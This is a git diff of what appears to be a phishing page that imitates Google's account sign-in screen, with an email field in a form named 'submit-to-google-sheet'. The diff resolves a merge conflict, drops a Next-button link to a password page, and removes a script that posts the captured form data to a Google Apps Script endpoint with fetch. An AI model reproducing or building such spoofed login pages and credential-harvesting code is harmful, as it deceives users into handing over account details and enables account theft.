@@ -21,21 +21,12 @@
             </div>
             <div id="top_text">Sign in</div>
             <div id="top_subtext">Use your Google Account</div>
-<<<<<<< HEAD
-            <form id="input_container" action="" name="submit-to-google-sheet">
-                <input type="text" name="Email" id="input">
-                <div id="placeholder">Email or phone</div>
-                <!-- <input type="password" name="pass" id="input">
-                <div id="placeholder">Password</div> -->
-            </form>
-            
-=======
             <form id="input_container" name = "submit-to-google-sheet">
                 <input type="text" name="Email" id="input">
                 <div id="placeholder">Email or phone</div>
             </form>
 
->>>>>>> d70984a485aa551c7ddd63a9e7f1c75275ee70e6
+
             <div id="link1" class="link">Forgot email?</div>
             <div id="not">Not your computer? Use Guest mode to sign in privately.</div>
             <div id="link2" class="link">Learn more</div>
@@ -44,7 +35,7 @@
                     <input type="button" value="Create account" id="btn_left">
                 </div>
                 <div id="btn2" class="btn_container">
-                    <a href="password.html"><button type="submit" value="Next" id="btn_right">Next</button></a>
+                    <button type="submit" value="Next" id="btn_right">Next</button>
                 </div>
                 
             </div>
@@ -77,16 +68,5 @@
     </script>
 
     <script src="script.js"></script>
-    <script>
-      const scriptURL = 'https://script.google.com/macros/s/AKfycby-3ImFCDYPtkWXMKN-B4uyIIXlKL_ge6DhSNGPNaQFSDRW5dYaKXsMfOiq6wNrMf3xpA/exec'
-      const form = document.forms['submit-to-google-sheet']
-    
-      form.addEventListener('Next', e => {
-        e.preventDefault()
-        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-          .then(response => console.log('Success!', response))
-          .catch(error => console.error('Error!', error.message))
-  })
-</script>
 </body>
 </html>
